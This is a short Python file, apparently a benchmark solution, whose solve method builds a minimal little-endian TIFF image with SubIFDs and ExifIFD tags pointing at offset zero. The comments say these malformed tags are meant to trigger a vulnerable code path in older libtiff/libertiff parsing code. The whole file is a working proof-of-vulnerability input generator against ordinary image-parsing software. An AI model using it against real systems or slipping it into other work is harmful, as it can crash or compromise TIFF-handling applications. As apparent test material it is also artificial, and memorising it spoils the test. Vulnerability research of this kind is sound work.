import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal TIFF that includes "offline" tags with zero offsets
        # to trigger the vulnerable path in older third_party/libtiff/libertiff.
        # Header: Little-endian TIFF
        header = b'II*\x00' + struct.pack('<I', 8)  # IFD offset at 8

        # IFD entries:
        # - ImageWidth (256), LONG, 1, value 1
        # - ImageLength (257), LONG, 1, value 1
        # - SubIFDs (330), LONG, 1, offset 0  (invalid offline tag)
        # - ExifIFD (34665), LONG, 1, offset 0 (invalid offline tag)
        entries = [
            (256, 4, 1, 1),
            (257, 4, 1, 1),
            (330, 4, 1, 0),
            (34665, 4, 1, 0),
        ]
        entries.sort(key=lambda x: x[0])

        ifd = struct.pack('<H', len(entries))
        for tag, typ, count, value in entries:
            ifd += struct.pack('<HHII', tag, typ, count, value)
        ifd += struct.pack('<I', 0)  # next IFD offset = 0

        return header + ifd